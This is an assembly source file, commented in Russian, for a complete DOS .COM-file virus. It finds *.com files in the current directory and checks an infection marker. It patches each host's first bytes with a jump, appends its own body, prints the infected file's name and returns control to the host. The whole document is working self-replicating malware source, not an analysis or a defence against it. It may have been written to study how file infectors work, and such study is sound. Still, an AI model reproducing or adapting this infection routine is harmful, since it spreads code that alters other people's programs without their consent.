.model tiny
.code
.386
org 100h
start:

    db 0e9h, 1, 0 ; трехбайтный jmp
    db 069h ; флаг заражения (можно поменять на 0ffh, чтобы дебагер правильно понял ближайшие команды)

inserted_code:
    mov bp, 0

code:

    ; возвращение первых четырех байтов оригинальной программы
    mov bx, 100h
    mov al, [bp + leading_bytes[0]]
    mov ah, [bp + leading_bytes[1]]
    mov word ptr[bx], ax
    mov bx, 102h
    mov al, [bp + leading_bytes[2]]
    mov ah, [bp + leading_bytes[3]]
    mov word ptr[bx], ax

    ; устанвока dta на file
    mov ah, 1ah
    lea dx, [bp + file]
    int 21h

    ; поиск файла-жертвы
    lea dx, [bp + file_mask]
    mov ah, 4eh
    int 21h
    jmp file_open

find_next:
    ; закрытие текущего файла и поиск следующего
    mov ah, 3eh
    int 21h
    mov ah, 4fh
    int 21h

file_open:

    ; открытие файла (дескриптор файла -> ax)
    lea dx, [bp + file.fname]
    mov ax, 3D02h
    int 21h
    mov bx, ax ; дескриптор файла (ax) -> bx
    
    ; в случае ошибки, возврат к оригинальной программе
    jc redirect
    
    ; перемещение каретки в начало
    mov cx, 0
    mov dx, 0
    mov ax, 4200h
    int 21h

    ; чтение первых 4 байт
    mov cx, 4
    lea dx, [bp + leading_bytes]
    mov ah, 3fh
    int 21h

    ; проверка на метку заражения
    cmp [bp + leading_bytes[3]], 69h
    jz find_next

    ; рассчитываем смещение заражаемого файла
    mov ax, word ptr [bp + file.fsize]
    mov [bp + jmp_length], ax
    sub ax, 4 ; поправка на первые 4 байта этой программы, которые не записываем
    mov [bp + victim_bp], ax

    ; перемещение каретки в начало
    mov cx, 0
    mov dx, 0
    mov ax, 4200h
    int 21h

    ; перезапись первых 4 байтов
    mov [bp + byte_buffer], 0e9h ; идентификатор трехбайтного безусловного переноса (jmp)
    lea dx, [bp + byte_buffer]
    mov cx, 1
    mov ah, 40h
    int 21h

    mov ax, [bp + jmp_length] ; величина перехода
    sub ax, 3 ; размер самой команды jmp
    mov [bp + word_buffer], ax
    lea dx, [bp + word_buffer]
    mov cx, 2
    mov ah, 40h
    int 21h

    mov [bp + byte_buffer], 069h ; метка заражения
    lea dx, [bp + byte_buffer]
    mov cx, 1
    mov ah, 40h
    int 21h
    
    ; перемещение каретки в конец файла
    mov cx, 0
    mov dx, 0
    mov ax, 4202h
    int 21h

    ; вставка mov bp, {_} кода
    mov [bp + byte_buffer], 0bdh ; идентификатор команды mov bp
    lea dx, [bp + byte_buffer]
    mov cx, 1
    mov ah, 40h
    int 21h

    lea dx, [bp + victim_bp] ; значение регистра bp для заражаемого файла
    mov cx, 2
    mov ah, 40h
    int 21h

    ; запись основного тела вируса
    lea dx, [bp + code]
    mov cx, offset vir_end
    sub cx, offset code
    mov ah, 40h
    int 21h

    ; закрытие файла
    mov ah, 3eh
    int 21h

    ; PAYLOAD BEGIN

    ; полезная нагрузка вируса (вывод на экран имя зараженного файла)
    ; вывод названия зараженного файла
    lea dx, [bp + file.fname]
    call str_f2c
    mov ah, 09h
    int 21h

    ; ввод переноса строки на новую строку и 
    lea dx, word_buffer
    mov byte ptr word_buffer[0], 13
    mov byte ptr word_buffer[1], '$'
    int 21h
    mov byte ptr word_buffer[0], 10
    int 21h
    call str_c2f

    ; PAYLOAD END

redirect:
    ; передача управления оригинальной программе
    mov ax, 100h
    jmp ax

procedures:

    ; процедура реформатирования строки для работы с файлами в строку для вывода на консоль
    str_f2c proc
        push cx
        push bx
        mov cx, 13
        str_f2c_lp:
            mov bx, dx
            add bx, 13
            sub bx, cx
            cmp byte ptr[bx], 0
            jz str_f2c_ch
        loop str_f2c_lp
        str_f2c_popret:
        pop bx
        pop cx
        ret
        str_f2c_ch:
        mov byte ptr [bx], '$'
        jmp str_f2c_popret
    str_f2c endp

    ; процедура реформатирования строки для вывода на консоль в строку для работы с файлами
    str_c2f proc
        push cx
        push bx
        mov cx, 13
        str_c2f_lp:
            mov bx, dx
            add bx, 13
            sub bx, cx
            cmp byte ptr[bx], '$'
            jz str_c2f_ch
        loop str_c2f_lp
        str_c2f_popret:
        pop bx
        pop cx
        ret
        str_c2f_ch:
        mov byte ptr [bx], 0
        jmp str_c2f_popret
    str_c2f endp

data:

    ; 4 первые якобы оригинальные байта этой самой программы:
    ;   mov ah, 4ch
    ;   int 21h
    leading_bytes db 0b4h, 4ch, 0cdh, 21h

    ; структура файла в буфере DTA
    DTAFileInfo struc
        freserved db 21 dup(?)
        fattr db ?
        ftime dw ?
        fdate dw ?
        fsize dd ?
        fname db 13 dup(?)
    ends
    
    file DTAFileInfo <>

    dword_buffer dd ?
    word_buffer dw ?
    byte_buffer db ?
    
    victim_bp dw ?
    jmp_length dw ?
    
    file_mask db '*.com*', 0

vir_end:

end start